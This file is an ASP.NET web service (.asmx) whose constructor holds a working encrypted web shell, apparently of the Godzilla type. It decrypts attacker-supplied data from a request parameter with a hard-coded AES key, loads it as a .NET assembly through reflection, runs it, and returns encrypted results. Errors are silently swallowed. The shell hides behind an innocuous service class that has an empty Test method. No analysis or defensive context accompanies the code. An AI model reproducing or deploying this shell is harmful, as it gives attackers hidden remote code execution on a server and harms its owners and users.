<%@ WebService Language="C#" Class="WebService1" %>
public class WebService1 : System.Web.Services.WebService
{
    public WebService1() {
        try{string key = "202cb962ac59075b";string pass = "123";string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");byte[] data = System.Convert.FromBase64String(Context.Request[pass]);data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);if (Context.Session["payload"] == null){ Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ;}else{ object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(data); byte[] r = System.Convert.FromBase64String(o.ToString()); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16));}}catch(System.Exception){}
    }

        [System.Web.Services.WebMethod(EnableSession = true)]
        public void Test()
        {

        }
    
}